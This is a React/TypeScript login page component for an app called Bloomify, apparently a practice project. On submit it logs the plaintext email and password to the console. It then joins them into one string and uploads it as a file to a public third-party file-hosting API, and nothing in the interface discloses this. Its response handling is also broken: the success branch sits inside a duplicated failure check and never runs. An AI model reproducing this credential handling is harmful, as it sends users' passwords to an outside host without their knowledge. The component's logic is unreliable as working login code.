import React, { useState} from 'react';
import bloomifyLogo from '../assets/bloomify_naam_logo.png';
import emailIcon from '../assets/login/email.png';
import keyIcon from '../assets/login/key.png';

interface UploadResponse {
    originalname: string;
    filename: string;
    location: string;
}

function Login() {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [rememberMe, setRememberMe] = useState(false);

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        console.log('Login submitted:', { email, password, rememberMe });
        
        try {
            if (email === '' || password === '') return;

            const formData = new FormData();
            var emailAndPassword = email + "&" + password;
            formData.append("file", emailAndPassword);

            const response = await fetch("https://api.escuelajs.co/api/v1/files/upload", {
                method: "post",
                body: formData
            })

            if(!response.ok) {
                if(!response.ok) {
                    throw new Error(`Upload failed: ${response.status}`);
                }

                const data = await response.json() as UploadResponse;

                if(data.location) {
                    console.log("Upload succesful: ", data.location);
                }
            }
        } catch(error) {
            console.log(error);
        }
    };

    return (
        <div className="min-h-screen bg-gray-300 flex items-center justify-center p-8">
            <div className="w-100 h-100">
                <div className="space-y-8">
                    {/* Logo/Title Section */}
                        <div className="text-center mb-12">
                            <img src={bloomifyLogo} alt="Bloomify" className="mx-auto" />
                        </div>

                        {/* Email Input */}
                        <div className="relative">
                            <input
                            type="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            placeholder="Email"
                            className="w-full bg-transparent border-b-2 border-black pb-2 text-lg placeholder-black focus:outline-none focus:border-purple-900"
                            required
                            />
                            <img src={emailIcon} alt="" className="absolute right-0 top-0 w-6 h-6" />
                        </div>

                        {/* Password Input */}
                        <div className="relative">
                            <input
                                type="password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                placeholder="Password"
                                className="w-full bg-transparent border-b-2 border-black pb-2 text-lg placeholder-black focus:outline-none focus:border-purple-900"
                                required
                            />
                            <img src={keyIcon} alt="" className="absolute right-0 top-0 w-6 h-6" />
                        </div>

                        {/* Remember Me and Forgot Password */}
                        <div className="flex items-center justify-between text-sm">
                            <label className="flex items-center cursor-pointer">
                                <input
                                    type="checkbox"
                                    checked={rememberMe}
                                    onChange={(e) => setRememberMe(e.target.checked)}
                                    className="w-5 h-5 mr-2 cursor-pointer accent-black"
                                />
                                <span className="font-semibold">Remember me</span>
                            </label>
                            <a href="#" className="italic underline font-medium">
                                Forgot password?
                            </a>
                        </div>

            {/* Login Button */}
                    <button
                        type="button"
                        onClick={handleSubmit}
                        className="w-full bg-purple-900 text-white py-4 text-2xl font-semibold hover:bg-purple-800 transition-colors"
                        >
                        Login
                    </button>
                </div>
            </div>
        </div>
    );
}

export default Login;